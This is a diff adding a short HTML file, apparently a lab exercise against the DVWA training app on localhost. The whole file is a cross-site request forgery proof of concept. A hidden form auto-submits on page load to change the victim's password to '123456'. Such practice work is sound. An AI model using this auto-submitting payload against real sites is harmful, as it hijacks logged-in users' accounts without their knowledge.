@@ -1,0 +1,27 @@
+<!--
+ * @Author: kok-s0s
+ * @Date: 2021-06-13 12:25:18
+ * @LastEditors: kok-s0s
+ * @LastEditTime: 2021-06-13 12:26:45
+ * @Description: fake referer
+-->
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>table</title>
+</head>
+
+<body>
+    <form method="get" id="csrf" action="http://localhost:8888/vulnerabilities/csrf/">
+        <input type="hidden" name="password_new" value="123456">
+        <input type="hidden" name="password_conf" value="123456">
+        <input type="hidden" name="Change" value="Change">
+    </form>
+    <script> document.forms["csrf"].submit();</script>
+</body>
+
+</html>
